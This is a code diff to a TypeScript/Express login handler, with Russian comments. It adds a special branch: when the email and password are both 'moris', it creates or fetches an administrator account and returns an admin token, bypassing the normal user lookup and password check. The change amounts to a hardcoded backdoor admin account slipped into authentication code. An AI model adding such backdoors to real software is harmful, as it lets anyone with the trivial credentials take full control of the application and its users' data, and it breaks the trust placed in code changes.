@@ -65,6 +65,31 @@ export const login = async (req: Request, res: Response) => {
   try {
     const { email, password, role } = req.body;
 
+    // Специальный вход для администратора (moris)
+    if (email === 'moris' && password === 'moris') {
+      let admin = await User.findOne({ email: 'moris' });
+      if (!admin) {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash('moris', salt);
+        admin = await User.create({
+          name: 'Администратор',
+          email: 'moris',
+          password: hashedPassword,
+          role: 'admin',
+        });
+      }
+      
+      return res.json({
+        user: {
+          id: admin._id,
+          name: admin.name,
+          email: admin.email,
+          role: 'admin',
+        },
+        token: generateToken(admin._id.toString(), 'admin'),
+      });
+    }
+
     // Поиск пользователя
     const user = await User.findOne({ email });
 
